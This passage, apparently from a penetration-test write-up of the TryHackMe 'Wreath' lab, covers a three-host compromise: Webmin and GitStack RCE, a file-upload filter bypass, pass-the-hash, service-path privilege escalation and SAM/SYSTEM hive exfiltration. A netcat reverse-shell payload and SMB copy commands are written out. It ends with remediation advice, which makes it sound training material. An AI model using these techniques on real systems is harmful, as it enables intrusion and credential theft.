uploading a malicious image file.Attack NarrativeFirst Machine (.200)We are given the ip of one of the systems on the network. This is the only machine in the network that can be immediately accessed, and thus it will be the first target.ReconnaissanceAs with all penetration tests, I started by enumerating the ports of the target. This is an important step, as it is useful in identifying possible attack vectors. The services and versions of our target can be enumerated using the nmap tool and giving it the flags -sC and -sV. The -sC flag runs nmap’s default scripts, while the -sV flag detects the versions of the scanned services. Note that knowing the version of a service is essential in determining the likelihood of it being vulnerable (old versions tend to have more known vulnerabilities, as they have been exposed to the warzone of the internet for a longer period of time). We can enumerate all open ports with the -p- flag and output all formats with the -oA flag.We see that there are only four ports open. From the nmap scan, observe that the target machine is running an HTTP and HTTPS server on ports 80 and 443 respectively. It’s important to notice that it is running Apache httpd 2.4.37 which belongs to the CentOS Linux distribution. Therefore, it’s very likely that the target is running CentOS.Using the curl tool to send a GET request to the server, we see that it is trying to redirect us to https://thomaswreath.thm. However, the DNS of the target is not set up, as can be observed from the domain not being able to route us to the requested website.Currently, this domain is not recognized by any of our VirtualHost[2] definitions. However, adding thomaswreath.thm to the /etc/hosts file (the file in Linux which is responsible for mapping hostnames to IP addresses), and running the same curl command again produces a different output:.We can add the -k flag to specify that we don’t care to verify the server’s certificate (note this is insecure but it is fine in the context of this test):And now we get what looks to be a webpage. Browsing to this domain through Firefox, we reach yet another warning:One thing that’s important to do before proceeding to the website is to check the server certificate. The certificate could give information about more domains that the web server may have, as well as some other useful information like names, locations, and email addresses. This can be checked by clicking on the “Advanced’’ box, and then clicking on the “View Certificate” link. I didn’t see anything too interesting, but there is one email address:I now proceeded to the website and was met with the following page:RCE ExploitationNothing out of the ordinary was found while browsing through this website. However, going back to the result of the nmap scan and looking at the software version of the Webmin interface, it turned out that this service was outdated. Searching this service on Google revealed that there is a CVE (Common Vulnerabilities and Exposures) for it. Namely, this vulnerability is categorised as CVE-2019-15107[3] and ranked as a 9.8 critical vulnerability. Exploiting this vulnerability allows unauthorized remote code execution (RCE) due to a backdoor in the password resetting function.Reverse ShellSeeing as this is a well known vulnerability, Metasploit already had a script to exploit this version of Webmin:After setting the LHOST and RHOST, I ran the exploit and got a shell!The web server was running as root! It is better practice to run a web service as a low-privileged user such as www-data just in case the web server gets compromised.PersistenceAs root, the highest-privileged Linux user, we can extract the hash of users on the system and try to crack it. It’s possible that this same password is used in some other machine on the network.  Providing the --example-hashes flag in hashcat (a tool for cracking hashes) and grepping for unix, we can see that the mode for the /etc/shadow hashes is 1800 (note that the hash corresponding to mode 1800 looks most similar to the hashes in the /etc/shadow file).Alternatively, another way to determine the identity of a hash is by using tools such as hashid or hash-identifier:The password used for the root user is secure enough to not be cracked by the rockyou.txt file, so I copied this hash to examine for later if needed.After compromising the root user, I maintained persistence by going into /root/.ssh/id_rsa and copying the contents of the id_rsa file (this is a private key which is used to authenticate a client to a server).Second Machine (.150)Host EnumerationWith full access on one of the three machines on the Wreath network, I enumerated the internal network to find any other systems by using nmap on the compromised system (a static binary of it can be downloaded on GitHub[4]). To speed up the process, I added the -sn flag which disables port scans.We see that there are a total of four other machines on the internal network (note we are 10.200.111.200). I was told by the client that the host ending in .1 is part of the AWS infrastructure used for creating the network, and the host ending in .250 is the OpenVPN server. As such, we will focus on the two hosts ending in .100 and .150.Port EnumerationAfter discovering these two hosts, I enumerated their ports:Observe that all of the ports on the .100 machine are filtered, but the .150 computer has three ports open (80, 3389, and 5985). It’s important to note that it’s likely this is a Windows machine due to ports 3389 (typically reserved for RDP) and 5985 (WRM / WinRM) being open.Port ForwardingThe HTTP service on port 80 is a good one to forward because web servers have a big attack surface (I chose to forward this port to localhost on port 18020 using ssh).Now when I visited localhost:18020, I was met with a web page:Looking at the error on the webpage, we see that there are three directories:  registration/login/  gitstack/  rest/The /user subdirectory under /rest discloses information about the users on the GitStack software, but I was unable to find anything that looked alarming.Visiting /gitstack redirected me to a login page on /registration/login:There is a nice handy message that says the default username and password is admin/admin, but trying it out reveals that the credentials for this login page have since been changed. The source code of the page did not reveal anything either.RCE ExploitationHowever, knowing that this machine is only available on the internal network, it is possible that its software is not updated. The outdated software of this website is especially alarming when looking at the output of nikto, a tool for scanning vulnerabilities on web servers:Note the large amount of outdated softwareIt follows that the GitStack software used on the target might also be outdated and vulnerable. Searchsploit is a great tool for finding exploits for outdated software:All three exploit results about GitStack are about the same version (namely 2.3.10). I then copied the exploit php/webapps/43777.py onto my local machine.Exploit AnalysisBefore running this exploit, we will examine it to see how it works:As can be seen from the image above, the password field is most likely vulnerable (as it turns out, the username field is also vulnerable). The python script injects PHP code into the password field, and the web server executes it. This critical vulnerability was caused by passing unsanitized user input into an exec function[5]:When running the script, it uploads a PHP web shell called exploit.php with the parameter ‘a’ to the /web directory (I modified the script and called it exploit-0xd4y.php, as it is good practice to change the default configurations of an exploit whether that be a password to a backdoor, parameters, etc).Reverse ShellI curled this web shell and provided it the -d flag to specify the data to be inputted:And this web server is running as System, the highest-privileged Windows user (even higher than Administrator)! I then tried to find a way to get a reverse shell from the exploited system. The first thing to test is to see if our attack box can be pinged from the target (I made sure to use the -n flag to specify how many packets to send). It is extremely important to note this seemingly insignificant flag. If we were to not specify how many packets to send, the server would constantly be trying to ping us, and there would be no way for us to stop this command without somehow killing the process. A constant ping to our attack box would therefore look suspicious.Pivoting through .200We can set up a tcpdump on the tun0 interface (the VPN routing path) and provide it with the icmp argument (Internet Control Message Protocol) so that we are only listening for pinging packets.Alas, I did not receive a response from the server. This meant that we cannot send a direct reverse shell from .150 to us. However, we can use nishang[6] to get a socat reverse shell relay. CentOS, the operating system of the compromised .200 machine, has a very restrictive firewall called firewalld that will limit almost all inbound connections.We can see that the firewall is activeUnfortunately, our attack box cannot “talk” with the .150 machine directly, but the host ending in .200 can. This means that we could get a reverse shell by setting up a listener on the .200 machine which forwards traffic to us, and then have the .150 host directly send the reverse shell to the .200 host.Socat Relay Reverse ShellI used a socat reverse shell to demonstrate this, as it is instructive on how networking traffic can be directed:  We are going to set up a listening port on 20001 on the .200 machine and forward all traffic from that port to 20002 on our machine.  Next, we will set up netcat listening on port 20002 on our system:  I used the Invoke-PowerShellTcp.ps1 nishang script and added Invoke-PowerShellTcp -Reverse -IPAddress 10.200.111.200 -Port 20001 to the bottom of the script, so that when downloading the script using IEX (more on this later), each line in the script will be automatically executed giving us a reverse shell:Note how we are sending the reverse shell to .200 on port 20001 (remember all traffic on port 20001 will be directed to our port 20002 on our machine).  Now, the firewall will block inbound connections for any ports that are not specified as exceptions. We have to tell the firewall which ports it should allow for connections by using the firewall-cmd command as such:Alternatively you can type systemctl stop firewalld to completely disable the firewall, though this is one of the noisiest actions a pentester can do, and it should only be done when it is an absolute necessity.Remember that port 20001 will be directing all traffic to us.  Port 20003 will be the HTTP server on .200 which we can set up with python3 -m http.server 20003; it will serve the powershell reverse shell file (which I renamed to 0xd4y-rev.ps1).  Finally, it’s time for the payload. We can download files / strings using IEX (Elixir’s Interactive Shell) in powershell.  Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotes.Unfortunately, this payload did not work (most likely due to some special characters). I am running commands through a web shell, and therefore it is likely that the server is not understanding some of the special characters in the payload. This means that most likely we will have to url-encode the payload for it to work:        Sure enough, when I executed this command, the output hanged and I got a hit on the python HTTP server!So now that 0xd4y-rev.ps1 was executed by the server, there should be a reverse shell getting sent to port 20001 on .200 which is getting forwarded to us on 20002:Attempting to Use MimikatzNow, with a reverse shell as System, we have the necessary privileges to extract password hashes using Mimikatz, a tool used to gather credentials on a system. Before downloading Mimikatz onto the target, it’s important to check if the target is a 32bit or 64bit computer by using the systeminfo command:Noticing that this is a 64bit computer, I downloaded a 64bit mimikatz binary:I downloaded this binary in the C:\Windows\System32\spool\drivers\color directory out of habit, as this is a world writable path and is typically whitelisted by AppLocker, a program which restricts which files can be executed based on the file’s path.Alas, running Mimikatz on an unstable shell simply does not work. I tried getting a meterpreter shell, but that did not work either. However, with ssh being open on .200, a powerful tool named sshuttle can be leveraged as a VPN into this internal network:We can confirm this worked by trying to curl the web page:Shell StabilizationEarlier, we found that port 3389 was open on the .150 system. This is the port typically designated for Remote Desktop Protocol (RDP), and we can use this port to get a nice GUI on the box. First, I created a user with admin privileges inside the Remote Management Users group so as to allow us to remotely authenticate as the user through RDP:We can now use evil-winrm with our created credentials to easily get a shell on the box:MimikatzWith the user that we created, a nice GUI instance can be established using the xfreerdp command as follows:This results in a GUI instance of the box. I executed cmd.exe as Administrator because the created user is part of the Administrators group. With administrative privileges, it’s possible to extract Windows’ stored credentials (I talk about this in depth in my Bastion Writeup[7]).  These NTLM Hashes were edited so as to not expose the full hashHow Mimikatz WorksLooking at the output of Mimikatz, we can see the hashes for all the users on the system. This is due to the single sign-on (SSO) feature of Windows. The SSO feature is used so as to not constantly ask the user to input his username and password whenever he wants to access a resource on the network, as this is simply tedious (once again, the great old war between convenience and security). Instead, the server hashes the user’s password and stores it in the SAM (Security Account Manager) hive. These credentials are then managed by the Local Security Authority (LSASS.exe), essentially enabling SSO.Copying the output of Mimikatz, I saw that Thomas has an insecure password which hashcat cracked (alternatively, you can use https://crackstation.net/[8]). However, the Administrator password was too secure to crack, but it is still possible to use this hash for authenticating as the Administrator user. Evil-winrm has an extremely powerful flag denoted with -H which is used to gain access to an account by performing a pass the hash attack (PtH).How a Pass the Hash Attack (PtH) WorksAs can be seen in the image above, we authenticated as Administrator despite not specifying the password for the user, confirming that PtH worked! This attack works as follows[9]:Pentester: Cool! I just got Administrator’s hash so let’s use evil-winrm to access the powershell.exe resource as Administrator. “Hey server! Give me powershell.exe as Administrator!”Server: “Hi there Pentester! I know you want powershell.exe as the Administrator user, but I can’t just give it to you without verifying first that you are in fact the Administrator. I’ll test you by sending you this random 16 byte integer: 65532345234…34324234. Encrypt this with your password hash and send the response back to me.”Pentester: No problem, I’ll encrypt this 16 byte number with Administrator’s hash. “Hey Server! Here is my encrypted response: #$()#@$(@!_#)($./121 (the actual encryption doesn’t really look like this in reality, but I will use this string for the purpose of demonstration).”Server: “Alright, thanks for the response Pentester. Hi Domain Controller! I challenged Pentester with this 16 byte integer: 65532345234…34324234, and this was his encrypted response:  #$()#@$(@!_#)($./121.Domain Controller: Right, well I have Server’s challenge and Pentester’s response. Let me go check my library of NTLM hashes and see if I can decrypt this response with Administrator’s hash…and I can! This must be Administrator then. “Hello Server, I was able to decrypt the response with Administrator’s hash, so this must be Administrator. Grant the client the powershell.exe resource.”Server: “Sure thing! Here you go Pentester!”Pentester: “Thanks for the shell!”Third Machine (.100)Port EnumerationAfter establishing persistence on the .150 host, the third and final machine is yet to be compromised (the .100 computer). The first thing we should do is enumerate the ports of the machine, just like we did with all the other compromised systems. Instead of trying to manually upload a port scanning script onto the box, we can use evil-winrm by utilizing the -s flag!We see that ports 80 and 3389 are open. These most likely correspond to HTTP and RDP respectively. Unfortunately, we cannot access this computer through the .200 proxy because it is only visible by .150.Forward SOCKS ProxyThis means that we will need to create a proxy on the .150 machine. A tool called chisel comes in handy for this operation. To set up a forward SOCKS proxy on the .150 machine, we first need to follow a couple of steps:  The server must be told to disable the firewall on the port we want to use for the forward proxy (I will use port 30001):  The server should then be told to listen on port 30001 for inbound connections:  Next, on the attacking box we want to connect to the listening port, and forward all data to a proxy sitting on 30002:  We then configure the web browser extension FoxyProxy to connect to this proxy:  Finally, we can visit the website sitting on .100:Examining the Web ServerAlong with FoxyProxy, Wappalyzer is also a very useful browser extension which displays useful information about how a website is built. Running this extension on Thomas’s personal website, we see the following:Analysing the Website’s CodeThis website looks identical to the one on the .200 host. Thomas told us that he is “serving a website that’s pushed to my git server”. The .150 machine has a git server and this is most likely what he was referring to, so I downloaded the source code of his website.Using the extractor tool from GitTools[10], I iterated through the commits of the git repository. Unfortunately, this tool does not list the commits by date, but this can be done manually by looking at the parent of each commit:We see that the commit starting with 70dd does not have a parent, so this must be the oldest commit. The parent of 82df is 70dd, and the parent of 345a is 82df. This means that from youngest to oldest the commits are as follows:  345a  82df  70ddWe can examine the code from the most recent commit. Seeing as Wappanalyzer identified Thomas’s webpage as being run in PHP, it follows that there should likely be an index.php file.Taking a look at the file, there seems to be an upload feature that redirects uploaded files to a directory called uploads/..The filter checks if a file is an image based on its size and if a file ends with a valid extension. We can see that the allowed extensions are jpg, jpeg, png, and gif, so I examined how the webpage identifies the extension:The explode function splits a string into an array based on a specified parameter. In the code, it is set to split based on the period character and grabs the string at index one (note that this is the second element in the array, as the first element is at index zero). It then compares this string with one of the allowed extensions. The problem with this is that upon uploading a file called reverse-shell.jpg.php, the code will split the file as follows:[‘reverse-shell’,’jpg’,’php’]Then, the string in the first index (jpg) will be compared. Thus, we have bypassed the first filter. The second filter (i.e. the image size check) can also be bypassed[11]. We can add a comment to an image with malicious php code, and if the server executes our image as php, then our malicious code will work as a web shell.A basic HTTP authentication is required to access the /resources directory, but we cracked Thomas’s hash before, so it is likely that Thomas reused this password for authentication to his web server. We can guess that the username is Thomas, or other variations of his name, and we get into the upload page (it turns out that the username was indeed Thomas).Reverse ShellI then uploaded the malicious image file (0xd4y-image.jpg.php):Visiting the uploaded script on resources/uploads/0xd4y-image.jpg.php reveals that it got successfully uploaded. To test if the image successfully is getting executed as php, I gave the command of whoami to the parameter cmd.And the php web shell works! The next step is to get a reverse shell. After identifying the target as a 64 bit machine by using systeminfo, I uploaded a 64bit netcat binary[12] and called it 0xd4y-nc.exe. I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl. To get a reverse shell, I used a simple nc reverse shell payload: powershell.exe%20C:\xampp\htdocs\resources\uploads\0xd4y-nc.exe%2010.50.112.6%20443%20-e%20cmd.exeNote how I used port 443 for the reverse shell, as this port tends to be treated as unsuspicious by AV. In contrast, using port 1337 or port 9001 seems very suspicious (but in this case it works anyways).Privilege Escalation to SystemSearching for MisconfigurationsEnumerating the privileges of our compromised user, we don’t see anything too out of the ordinary.However, this user does have the SeImpersonatePrivilege which could potentially be vulnerable to exploits such as Juicy Potato[13] (note that even though this is a 2019 Windows system rather than 2016, there have been some exploitations of this privilege in later versions[14]).  I ignored this potential privilege escalation vector due to its greater complexity, and I enumerated the services for a potential vulnerability to an unquoted service path attack.Unquoted Service Path Attack It’s likely that the default Windows paths will not be vulnerable to this sort of attack, so I focused on services that were not in C:\Windows.As it turned out, there was a service that contained an unquoted path called SystemExplorerHelpService.How an Unquoted Service Path Attack WorksDue to there not being quotes around the path to this service, Windows does not know where to execute the desired binary. Seeing as the path for this vulnerable service is C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe, Windows will check for a binary in the following order[15]:  C:\Program.exe  C:\Program Files (x86)\System.exe  C:\Program Files (x86)\System Explorer\System.exe  C:\Program Files (x86)\System Explorer\System Explorer\service.exe  C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exeIt is highly unlikely that the compromised user has write access to C:\Program Files(x86), but it is probable that the user can write to C:\Program Files(x86)\System Explorer. Therefore, we can create a malicious binary called System.exe in the appropriate path, and it will get executed.Creating a Malicious BinaryChecking to see if this service is running as System revealed that it is!This seemed like a good vector for privilege escalation, however, I understood that I would be lucky if the compromised user had permissions to edit this service.Seeing as we are part of the BUILTIN\Users group, we have FullControl to this service! The System Explorer executable can therefore be replaced by whatever we would like. I created a program in C# called malicious.cs that returns a reverse shell.Following the creation of the script, I compiled this program with mcs, a C# compiler:After compiling the program, I renamed malicious.exe to System.exe. Seeing as System is running the service we are trying to hijack, it follows that we should get a reverse shell as System when restarting the service. After downloading the binary to the target, I copied it over to the C:\Program Files (x86)\System Explorer\ directory.With the malicious binary in place, I set up a netcat listener on port 443 (as specified in the C# code) before restarting the service:Typing sc stop SystemExplorerHelpService (to stop the service) and sc start SystemExplorerHelpService (to start the service) resulted in a reverse shell as System:Data ExfiltrationNow, with a reverse shell as System, we can extract the stored credentials on this system. Mimikatz cannot be used as Antivirus is installed on this machine. However, because we are System, we can copy the SAM and SYSTEM files and locally extract the stored hashes. I set up an SMB server on my machine to download the files with sudo impacket-smbserver share . -smb2support -username 0xd4y -password pass and transferred the SAM and SYSTEM hives as follows:Note that we received the NTLMV2 hash of our created SMB user. Cracking this hash reveals that the password of 0xd4y is pass.On the reverse shell, I typed copy HKLM\SYSTEM \\10.50.112.6\share\SYSTEM, andcopy HKLM\SAM \\10.50.112.6\share\SAMNow with the sensitive SAM and SYSTEM hives on my local system, I was able to extract all hashes using the impacket-secretsdump tool.CleanupAfter fully compromising the Wreath Network, I deleted all the binaries that I downloaded (namely 0xd4y-socat, 0xd4y-nc.exe, System.exe, and exploit-0xd4y.php). Though the removal of these binaries allowed for a stealthier compromise, the attacks conducted in this report were not meant to be particularly stealthy. Many binaries used were not obfuscated, and file transfers were conducted over SMB and HTTP rather than HTTPS.ConclusionThe attack surface of a web server is much bigger than most other services. It is essential to be wary of which services are running as a privileged user. There was no need for local privilege escalation in two out of three compromised machines during this penetration test. If possible, it should be refrained from using root to run services unless it is absolutely necessary. This will cause a greater difficulty for an attacker to attain root access on a system, and will greatly mitigate the potential damage in case of a breach.The client had multiple critical vulnerabilities in his network. The specific remediations for patching the vulnerabilities outlined in this report are as follows:      Install the latest software for all running services, even if a system is only running on an internal network with no outside internet access        The first and second compromised machines had old software with critical vulnerabilities which can be easily patched by updating the software        Refrain from using root to run any services unless it is absolutely necessary        This note is especially true for web servers as they have a large attack surface. It is recommend to create a low-privileged user specifically for the purpose of running a web service        Never reuse passwords        A cracked password from the second compromised machine was reused for accessing a webpage on the third machine        Be mindful of potential misconfigurations.    The privilege escalation on the client’s personal computer was possible due to a misconfiguration of a service running as System      The compromised low-privileged user was able to configure services despite not being part of the Administrators group        Filters in code should be meticulously analyzed    Code for uploading files on the website of the third machine did not successfully filter potentially malicious filesThe goals of this penetration test were met. As requested by the client, I was able to successfully compromise the Wreath network with root access on all three systems. The client is highly encouraged to patch his systems with the aforementioned remediations as soon as possible.[1] https://tryhackme.com/room/wreath [2] https://httpd.apache.org/docs/2.4/vhosts/details.html [3] https://nvd.nist.gov/vuln/detail/CVE-2019-15107   [4] https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap [5] https://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf [6] https://github.com/samratashok/nishang [7] https://0xd4y.github.io/Writeups/HackTheBox/Bastion%20Writeup.pdf [8] This website can be particularly fast in cracking unsalted hashes because it uses a rainbow table.[9] https://www.youtube.com/watch?v=cBXdoIuLzmA&amp;ab_channel=1ENews [10] https://github.com/internetwache/GitTools [11] https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass [12] https://github.com/int0x33/nc.exe/ [13] https://github.com/ohpe/juicy-potato [14] https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ [15] https://gracefulsecurity.com/privesc-unquoted-service-path/",
      "image": "/images/0xd4y-logo-gray.png"
    } 
  
]

